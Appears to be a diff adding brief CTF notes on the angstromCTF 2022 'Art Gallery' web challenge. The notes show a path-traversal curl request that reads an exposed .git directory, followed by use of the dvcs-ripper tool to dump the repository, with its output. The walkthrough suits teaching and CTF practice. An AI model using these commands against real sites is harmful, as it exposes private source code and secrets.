@@ -1,0 +1,37 @@
+Tried to access ./git folder but not found
+Tried to see any git commits but nothing found
+Tried to do file / path enumeration, think thats the way as per this works kinda
+https://art-gallery.web.actf.co/gallery?member=../
+but no joy
+
+
+_________________________________________
+
+As per this writeup
+https://github.com/satoki/ctf_writeups/tree/master/%C3%A5ngstromCTF_2022/Art_Gallery
+The correct url for the ./git was this
+curl -s "https://art-gallery.web.actf.co/gallery?member=../.git/HEAD" | strings
+
+git clone https://github.com/kost/dvcs-ripper.git
+~~~
+$ mkdir dump; cd dump
+$ ../dvcs-ripper/rip-git.pl -v -u "https://art-gallery.web.actf.co/gallery?member=../.git/"
+[i] Downloading git files from https://art-gallery.web.actf.co/gallery?member=../.git/
+[i] Auto-detecting 404 as 200 with 3 requests
+[i] Getting 200 as 404 responses. Adapting...
+[i] Using session name: IPKgmFnO
+[d] found COMMIT_EDITMSG
+[d] found config
+[d] found description
+[d] found HEAD
+[d] found index
+[!] Not found for packed-refs: 404 as 200
+[!] Not found for objects/info/alternates: 404 as 200
+[!] Not found for info/grafts: 404 as 200
+[d] found logs/HEAD
+[d] found objects/56/449caeb7973b88f20d67b4c343cbb895aa6bc7
+[d] found objects/71/3a4aba8af38c9507ced6ea41f602b105ca4101
+[d] found objects/1c/584170fb33ae17a63e22456f19601efb1f23db
+[d] found refs/heads/master
+[!] Not found for: 404 as 200
+[i] Running git fsck to check for missing items
